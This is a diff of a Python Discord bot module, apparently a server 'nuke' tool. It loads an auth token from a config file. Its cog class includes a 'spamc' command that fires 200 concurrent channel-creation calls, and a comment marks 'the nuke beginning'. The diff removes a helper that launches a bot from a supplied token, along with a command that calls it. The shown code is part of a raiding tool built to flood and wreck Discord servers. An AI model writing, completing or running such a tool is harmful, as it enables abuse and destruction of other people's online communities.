@@ -1,8 +1,6 @@
-from unittest import async_case
 import discord, asyncio, time, json
 from aiohttp import *
 from discord.ext import commands as dortrox
-intents = discord.Intents().all()
 global ban
 fObj = open('config.json',)
 ogdata = json.load(fObj)
@@ -14,13 +12,6 @@ role_json = ogdata['role_json']
 headers = {'User-Agent': uagent, 'Authorization': token }
 
 
-async def log(hokus):
-    bot = dortrox.Bot(command_prefix= "?", help_command=None, intents=intents,)
-    @bot.event
-    async def on_ready():
-        print("ready")
-        
-    bot.run(hokus, bot=True)
 
 #The nuke beginning: 
 
@@ -141,10 +132,6 @@ class nuke(dortrox.Cog):
     @dortrox.command()
     async def spamc(self, ctx):
         await asyncio.gather(*[cs(ctx) for _ in range(200)])
-
-    @dortrox.command()
-    async def do(self, ctx, hokus):
-        await log(hokus)
 
 def setup(dortrox):
     dortrox.add_cog(nuke(dortrox))
